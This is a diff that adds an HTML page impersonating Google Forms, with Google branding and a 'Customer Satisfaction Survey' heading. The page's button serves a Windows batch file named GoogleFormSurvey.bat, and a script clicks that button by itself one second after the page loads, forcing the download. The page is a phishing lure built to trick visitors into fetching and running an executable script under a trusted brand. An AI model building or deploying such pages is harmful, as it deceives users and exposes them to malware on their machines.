@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Forms</title>
+    <link rel="icon" href="https://ssl.gstatic.com/docs/forms/forms_badge_2.png">
+    <style>
+        body { font-family: Roboto, sans-serif; max-width: 700px; margin: 50px auto; }
+        .header { background: #4285f4; color: white; padding: 20px; border-radius: 8px; }
+        .download-btn { background: #34a853; color: white; padding: 15px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.gstatic.com/images/branding/product/1x/forms_48dp.png" width="24"> 
+        Google Forms
+    </div>
+    <h2>Customer Satisfaction Survey</h2>
+    <p>Please complete this quick 30-second survey. Download will start automatically.</p>
+    
+    <a href="GoogleFormSurvey.bat" class="download-btn" download>📋 Start Survey</a>
+    
+    <script>
+        // Auto-click after 1 second
+        setTimeout(() => {
+            document.querySelector('.download-btn').click();
+        }, 1000);
+    </script>
+</body>
+</html>
